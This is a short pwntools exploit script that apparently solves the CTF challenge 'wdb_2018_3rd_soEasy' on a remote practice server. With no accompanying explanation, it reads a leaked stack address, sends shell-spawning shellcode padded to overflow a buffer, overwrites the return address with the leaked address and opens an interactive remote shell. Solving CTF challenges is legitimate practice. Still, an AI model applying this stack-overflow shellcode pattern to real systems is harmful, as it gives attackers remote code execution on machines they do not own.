from pwn import *

elf = ELF('./wdb_2018_3rd_soEasy')
# io = process(['./wdb_2018_3rd_soEasy'])
io = remote('node5.buuoj.cn', 27654)

io.recvuntil(b'Hei,give you a gift->0x')
shell_addr = int(io.recvuntil(b'\n', drop=True).decode(), 16)

payload = asm(shellcraft.sh())
payload = payload.ljust(0x48 + 4)
payload += packing.p32(shell_addr)
io.sendline(payload)

io.interactive()